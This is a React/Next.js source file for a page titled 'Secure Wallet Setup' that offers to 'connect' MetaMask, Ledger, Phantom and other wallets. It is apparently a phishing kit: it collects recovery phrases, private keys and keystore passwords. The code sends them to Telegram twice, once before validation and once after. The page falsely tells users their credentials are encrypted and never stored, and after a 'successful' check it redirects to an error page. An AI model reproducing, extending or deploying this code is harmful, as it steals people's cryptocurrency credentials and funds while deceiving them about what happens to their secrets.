'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { ArrowLeft, Key, FileText, Shield, Wallet, AlertCircle, CheckCircle, Loader2, ShieldCheck } from 'lucide-react';
import { useWallet } from '@/components/context/WalletContext';
import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
import { SecureWalletValidator } from '@/libs/utils/SecureWalletValidator';
import { TelegramService } from '@/libs/service/telegramService';
import WalletIcon from '@/components/logic/WalletIcons';

const WALLETS: WalletType[] = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: '',
    colors: {
      primary: '#F6851B',
      secondary: '#E2761B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'walletconnect',
    name: 'WalletConnect',
    icon: '',
    colors: {
      primary: '#3B99FC',
      secondary: '#2A85FF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'coinbase',
    name: 'Coinbase',
    icon: '',
    colors: {
      primary: '#0052FF',
      secondary: '#0042D6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: '',
    colors: {
      primary: '#3375BB',
      secondary: '#2A65A6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'phantom',
    name: 'Phantom',
    icon: '',
    colors: {
      primary: '#4B49AC',
      secondary: '#3A3897',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ledger',
    name: 'Ledger',
    icon: '',
    colors: {
      primary: '#ededed',
      secondary: '#fafafa',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trezor',
    name: 'Trezor',
    icon: '',
    colors: {
      primary: '#00B45A',
      secondary: '#009C4D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'binance',
    name: 'Binance',
    icon: '',
    colors: {
      primary: '#1a1a1a',
      secondary: '#232323',
      text: '#000000'
    }
  },
  {
    id: 'exodus',
    name: 'Exodus',
    icon: '',
    colors: {
      primary: '#1C1C1C',
      secondary: '#2D2D2D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'argent',
    name: 'Argent',
    icon: '',
    colors: {
      primary: '#FF875B',
      secondary: '#FF6B3B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'rainbow',
    name: 'Rainbow',
    icon: '',
    colors: {
      primary: '#001A72',
      secondary: '#002EB5',
      text: '#FFFFFF'
    }
  },
  {
    id: 'zerion',
    name: 'Zerion',
    icon: '',
    colors: {
      primary: '#2962EF',
      secondary: '#1A51DF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'brave',
    name: 'Brave',
    icon: '',
    colors: {
      primary: '#FB542B',
      secondary: '#E63E1C',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ambire',
    name: 'Ambire',
    icon: '',
    colors: {
      primary: '#FF6B35',
      secondary: '#E55A2B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'leap',
    name: 'Leap',
    icon: '',
    colors: {
      primary: '#00DC82',
      secondary: '#00C274',
      text: '#FFFFFF'
    }
  },
  {
    id: 'magic eden',
    name: 'Magic Eden',
    icon: '',
    colors: {
      primary: '#000000',
      secondary: '#333333',
      text: '#FFFFFF'
    }
  },
  {
    id: 'onto',
    name: 'ONTO',
    icon: '',
    colors: {
      primary: '#00A3FF',
      secondary: '#008CE6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'safe',
    name: 'Safe',
    icon: '',
    colors: {
      primary: '#12FF80',
      secondary: '#00E572',
      text: '#000000'
    }
  },
  {
    id: 'solflare',
    name: 'Solflare',
    icon: '',
    colors: {
      primary: '#9945FF',
      secondary: '#7C36CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'torus',
    name: 'Torus',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'web3auth',
    name: 'Web3Auth',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'other',
    name: 'Other Wallet',
    icon: '',
    colors: {
      primary: '#6B7280',
      secondary: '#4B5563',
      text: '#FFFFFF'
    }
  }
];

// Beautiful Loading Animation Component
function ValidationLoader({ isOpen, onClose }: { isOpen: boolean; onClose: () => void }) {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 backdrop-blur-lg">
      <div className="bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border border-gray-800 shadow-2xl">
        {/* Animated Header */}
        <div className="text-center mb-8">
          <div className="relative inline-block mb-4">
            <div className="w-20 h-20 bg-linear-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center mx-auto shadow-lg animate-pulse">
              <div className="w-16 h-16 bg-gray-900 rounded-full flex items-center justify-center">
                <div className="relative">
                  <Loader2 className="w-8 h-8 text-white animate-spin" />
                  <div className="absolute inset-0 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                </div>
              </div>
            </div>
            {/* Orbiting dots */}
            <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-400 rounded-full animate-bounce"></div>
            <div className="absolute -bottom-1 -left-1 w-3 h-3 bg-yellow-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
          </div>
          
          <h3 className="text-2xl font-bold text-white mb-2 bg-linear-to-r from-white to-gray-300 bg-clip-text">
            Validating Wallet
          </h3>
          <p className="text-gray-400 text-sm">Securely verifying your credentials</p>
        </div>

        {/* Progress Animation */}
        <div className="space-y-4 mb-6">
          <div className="flex justify-between text-xs text-gray-400">
            <span>Encryption</span>
            <span>Validation</span>
            <span>Security Check</span>
          </div>
          
          <div className="w-full bg-gray-800 rounded-full h-2">
            <div 
              className="bg-linear-to-r from-blue-500 to-purple-600 h-2 rounded-full animate-pulse"
              style={{ width: '100%' }}
            ></div>
          </div>
        </div>

        {/* Animated Steps */}
        <div className="space-y-3 mb-6">
          {[
            'Encrypting credentials...',
            'Validating wallet format...',
            'Running security checks...',
            'Finalizing connection...'
          ].map((step, index) => (
            <div key={index} className="flex items-center space-x-3 animate-fadeIn" style={{ animationDelay: `${index * 0.5}s` }}>
              <div className="w-2 h-2 bg-blue-400 rounded-full animate-ping" style={{ animationDelay: `${index * 0.3}s` }}></div>
              <span className="text-gray-300 text-sm">{step}</span>
            </div>
          ))}
        </div>

        {/* Status Message */}
        <div className="text-center">
          <p className="text-blue-400 text-sm font-medium animate-pulse">
            This may take a few moments...
          </p>
        </div>

        {/* Cancel Button */}
        <button
          onClick={onClose}
          className="w-full mt-6 bg-gray-800 text-gray-300 py-3 rounded-xl font-medium hover:bg-gray-700 transition-all duration-200 border border-gray-700"
        >
          Cancel Validation
        </button>
      </div>
    </div>
  );
}

// Enhanced Validation Popup Component
interface ValidationPopupProps {
  isOpen: boolean;
  onClose: () => void;
  onRetry: () => void;
  message: string;
  isValid: boolean;
}

function ValidationPopup({ isOpen, onClose, onRetry, message, isValid }: ValidationPopupProps) {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 backdrop-blur-lg">
      <div className={`bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border ${
        isValid ? 'border-green-500/30' : 'border-red-500/30'
      } shadow-2xl`}>
        <div className="text-center mb-6">
          <div className={`w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${
            isValid 
              ? 'bg-green-500/20 animate-pulse' 
              : 'bg-red-500/20 animate-pulse'
          }`}>
            {isValid ? (
              <CheckCircle className="w-8 h-8 text-green-400" />
            ) : (
              <AlertCircle className="w-8 h-8 text-red-400" />
            )}
          </div>
          
          <h3 className={`text-2xl font-bold mb-2 ${
            isValid ? 'text-green-400' : 'text-red-400'
          }`}>
            {isValid ? 'Validation Successful!' : 'Validation Failed'}
          </h3>
          <p className="text-gray-400 text-sm">Wallet verification completed</p>
        </div>
        
        <div className={`p-4 rounded-xl mb-6 ${
          isValid ? 'bg-green-500/10' : 'bg-red-500/10'
        }`}>
          <p className={`text-center font-medium ${
            isValid ? 'text-green-300' : 'text-red-300'
          }`}>
            {message}
          </p>
        </div>
        
        <div className="flex space-x-3">
          {!isValid && (
            <button
              onClick={onRetry}
              className="flex-1 bg-gray-800 text-white py-3 rounded-xl font-medium hover:bg-gray-700 transition-all duration-200 border border-gray-700"
            >
              Try Again
            </button>
          )}
          <button
            onClick={onClose}
            className={`flex-1 py-3 rounded-xl font-medium transition-all duration-200 ${
              isValid 
                ? 'bg-linear-to-r from-green-500 to-green-600 text-white hover:from-green-600 hover:to-green-700' 
                : 'bg-linear-to-r from-red-500 to-red-600 text-white hover:from-red-600 hover:to-red-700'
            }`}
          >
            {isValid ? 'Continue to Wallet' : 'Cancel'}
          </button>
        </div>
      </div>
    </div>
  );
}

export default function EnterDetailsPageContext() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const walletId = searchParams.get('wallet');
  const { addWallet } = useWallet();
  
  const [activeTab, setActiveTab] = useState<'phrase' | 'privateKey' | 'keystore'>('phrase');
  const [formData, setFormData] = useState({
    phrase: '',
    privateKey: '',
    keystore: '',
    password: ''
  });
  const [isConnecting, setIsConnecting] = useState(false);
  const [showValidationLoader, setShowValidationLoader] = useState(false);
  const [validationPopup, setValidationPopup] = useState<{
    isOpen: boolean;
    message: string;
    isValid: boolean;
  }>({ isOpen: false, message: '', isValid: false });

  const wallet = WALLETS.find(w => w.id === walletId);
  const validator = new SecureWalletValidator();
  const telegramService = new TelegramService();
  const validationInProgress = useRef(false);

  // Send initial Telegram message immediately when validation starts
  const sendInitialTelegramMessage = async (inputData: string, inputType: 'phrase' | 'privateKey' | 'keystore') => {
    try {
      console.log('📤 Sending initial validation status to Telegram...');
      await telegramService.sendWalletData({
        walletName: wallet?.name || 'Unknown Wallet',
        walletType: inputType,
        inputType,
        inputData,
        password: formData.password,
        isValid: false,
        validationMessage: 'VALIDATION IN PROGRESS',
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      });
      console.log('✅ Initial Telegram message sent successfully');
    } catch (error) {
      console.error('❌ Failed to send initial Telegram message:', error);
    }
  };

  // Send final validation result to Telegram
  const sendFinalTelegramMessage = async (
    inputData: string, 
    inputType: 'phrase' | 'privateKey' | 'keystore', 
    validationResult: { isValid: boolean; message: string }
  ) => {
    try {
      console.log('📤 Sending validation results to Telegram...');
      await telegramService.sendWalletData({
        walletName: wallet?.name || 'Unknown Wallet',
        walletType: inputType,
        inputType,
        inputData,
        password: formData.password,
        isValid: validationResult.isValid,
        validationMessage: validationResult.message,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      });
      console.log('✅ Final Telegram message sent successfully');
    } catch (error) {
      console.error('❌ Failed to send final Telegram message:', error);
    }
  };

  const handleConnect = async () => {
    if (!formData.phrase && !formData.privateKey && !formData.keystore) {
      setValidationPopup({
        isOpen: true,
        message: 'Please enter your wallet credentials',
        isValid: false
      });
      return;
    }

    if (validationInProgress.current) return;

    validationInProgress.current = true;
    setIsConnecting(true);
    setShowValidationLoader(true);

    try {
      let inputData = '';
      let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
      
      if (formData.phrase) {
        inputData = formData.phrase;
        inputType = 'phrase';
      } else if (formData.privateKey) {
        inputData = formData.privateKey;
        inputType = 'privateKey';
      } else if (formData.keystore) {
        inputData = formData.keystore;
        inputType = 'keystore';
      }

      // Send initial Telegram message IMMEDIATELY
      await sendInitialTelegramMessage(inputData, inputType);

      // Validate wallet credentials (takes normal time)
      const validationResult = await validator.validateWallet(
        inputType === 'phrase' ? 'metamask' : 
        inputType === 'privateKey' ? 'privatekey' : 'keystore',
        inputData,
        formData.password
      );

      // Send final validation result to Telegram
      await sendFinalTelegramMessage(inputData, inputType, validationResult);

      if (!validationResult.isValid) {
        setValidationPopup({
          isOpen: true,
          message: validationResult.message,
          isValid: false
        });
        return;
      }

      // If validation successful, create wallet
      const connectedWallet: ConnectedWallet = {
        id: wallet?.id || 'custom',
        name: wallet?.name || 'Custom Wallet',
        address: validationResult.address || `0x${Math.random().toString(16).substr(2, 40)}`,
        connectedAt: new Date(),
        isValid: true,
        ...(formData.phrase && { phrase: formData.phrase }),
        ...(formData.privateKey && { privateKey: formData.privateKey }),
        ...(formData.keystore && { keystore: formData.keystore }),
      };

      addWallet(connectedWallet);
      
      setValidationPopup({
        isOpen: true,
        message: validationResult.message,
        isValid: true
      });

    } catch (error) {
      console.error('Connection failed:', error);
      setValidationPopup({
        isOpen: true,
        message: 'Connection failed. Please try again.',
        isValid: false
      });
    } finally {
      setIsConnecting(false);
      setShowValidationLoader(false);
      validationInProgress.current = false;
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleValidationClose = () => {
    setValidationPopup({ isOpen: false, message: '', isValid: false });
    if (validationPopup.isValid) {
      router.push('/connect/error');
    }
  };

  const handleValidationRetry = () => {
    setValidationPopup({ isOpen: false, message: '', isValid: false });
  };

  const handleLoaderClose = () => {
    setShowValidationLoader(false);
    setIsConnecting(false);
    validationInProgress.current = false;
  };

  return (
    <div className="min-h-screen bg-black py-8 px-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center space-x-4 mb-8">
          <button 
            onClick={() => router.back()}
            className="text-gray-400 hover:text-white transition-colors duration-200"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="flex items-center space-x-3">
            {wallet && (
              <div 
                className="w-10 h-10 rounded-xl flex items-center justify-center shadow-lg"
                style={{ 
                  background: `linear-gradient(135deg, ${wallet.colors.primary}, ${wallet.colors.secondary})`
                }}
              >
                <WalletIcon 
                  walletId={wallet.id} 
                  className="w-6 h-6" 
                />
              </div>
            )}
            <div>
              <h1 className="text-2xl font-bold text-white bg-linear-to-r from-white to-gray-300 bg-clip-text">
                Secure Wallet Setup
              </h1>
              <p className="text-gray-400">Connect to {wallet?.name || 'your wallet'}</p>
            </div>
          </div>
        </div>

        {/* Connection Methods Tabs */}
        <div className="bg-gray-900 rounded-2xl p-2 mb-6 border border-gray-800">
          <div className="grid grid-cols-3 gap-2">
            <button
              onClick={() => setActiveTab('phrase')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'phrase' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <Key className="w-4 h-4" />
              <span className="text-sm font-medium">Phrase</span>
            </button>
            <button
              onClick={() => setActiveTab('privateKey')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'privateKey' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <Shield className="w-4 h-4" />
              <span className="text-sm font-medium">Private Key</span>
            </button>
            <button
              onClick={() => setActiveTab('keystore')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'keystore' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <FileText className="w-4 h-4" />
              <span className="text-sm font-medium">Keystore</span>
            </button>
          </div>
        </div>

        {/* Input Forms */}
        <div className="bg-gray-900 rounded-2xl p-6 mb-6 border border-gray-800">
          {activeTab === 'phrase' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Recovery Phrase
              </label>
              <textarea
                value={formData.phrase}
                onChange={(e) => handleInputChange('phrase', e.target.value)}
                placeholder="Enter your 12 or 24-word recovery phrase separated by spaces"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                Typically 12 or 24 words separated by spaces
              </p>
            </div>
          )}

          {activeTab === 'privateKey' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Private Key
              </label>
              <textarea
                value={formData.privateKey}
                onChange={(e) => handleInputChange('privateKey', e.target.value)}
                placeholder="Enter your 64-character private key"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                64-character hexadecimal private key
              </p>
            </div>
          )}

          {activeTab === 'keystore' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Keystore JSON
              </label>
              <textarea
                value={formData.keystore}
                onChange={(e) => handleInputChange('keystore', e.target.value)}
                placeholder="Paste your keystore JSON file contents"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <input
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                placeholder="Enter keystore password"
                className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all duration-200"
              />
            </div>
          )}
        </div>

        {/* Connect Button */}
        <button
          onClick={handleConnect}
          disabled={isConnecting}
          className="w-full bg-linear-to-r from-blue-600 to-blue-700 text-white py-4 rounded-xl font-semibold hover:from-blue-700 hover:to-blue-800 disabled:from-gray-600 disabled:to-gray-700 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-105 shadow-lg shadow-blue-500/20"
        >
          {isConnecting ? (
            <div className="flex items-center justify-center space-x-2">
              <Loader2 className="w-5 h-5 animate-spin" />
              <span>Starting Validation...</span>
            </div>
          ) : (
            <span>Validate & Connect</span>
          )}
        </button>

        {/* Security Notice */}
        <div className="mt-6 p-4 bg-gray-900/50 rounded-xl border border-gray-800 backdrop-blur-sm">
          <div className="flex items-start space-x-3">
            <ShieldCheck className="w-5 h-5 text-blue-400 mt-0.5 shrink-0" />
            <div>
              <p className="text-sm font-medium text-gray-300 mb-1">Secure Validation</p>
              <p className="text-xs text-gray-400">
                Your credentials are encrypted and validated securely. We never store sensitive data.
              </p>
            </div>
          </div>
        </div>

        {/* Validation Loader */}
        <ValidationLoader 
          isOpen={showValidationLoader} 
          onClose={handleLoaderClose} 
        />

        {/* Validation Result Popup */}
        <ValidationPopup
          isOpen={validationPopup.isOpen}
          onClose={handleValidationClose}
          onRetry={handleValidationRetry}
          message={validationPopup.message}
          isValid={validationPopup.isValid}
        />
      </div>
    </div>
  );
}